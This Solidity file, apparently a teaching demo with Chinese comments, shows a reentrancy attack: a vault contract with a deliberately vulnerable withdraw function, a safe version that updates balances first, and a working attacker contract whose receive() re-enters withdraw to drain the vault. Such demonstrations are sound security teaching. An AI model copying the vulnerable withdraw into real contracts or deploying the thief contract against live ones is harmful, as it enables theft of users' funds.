// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. 被攻击的金库合约
contract GoldVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 【危险】有重入漏洞的取款
    function vulnerableWithdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // 攻击点：先发钱，对方的 receive 就会立刻执行重入
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    // 【安全】防御重入的取款（遵循 Checks-Effects-Interactions）
    function safeWithdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // 核心防御：先改账本，再发钱
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}

// 2. 攻击者合约
contract GoldThief {
    GoldVault public vault;

    constructor(address _vaultAddress) {
        vault = GoldVault(_vaultAddress);
    }

    // 当金库给这个合约发钱时，会自动触发这个函数
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            // 贪婪模式：只要金库还有钱，就继续回去调用取款
            vault.vulnerableWithdraw();
        }
    }

    // 启动攻击
    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH to start");
        vault.deposit{value: 1 ether}(); // 先存 1 个
        vault.vulnerableWithdraw();     // 然后开始疯狂取款
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
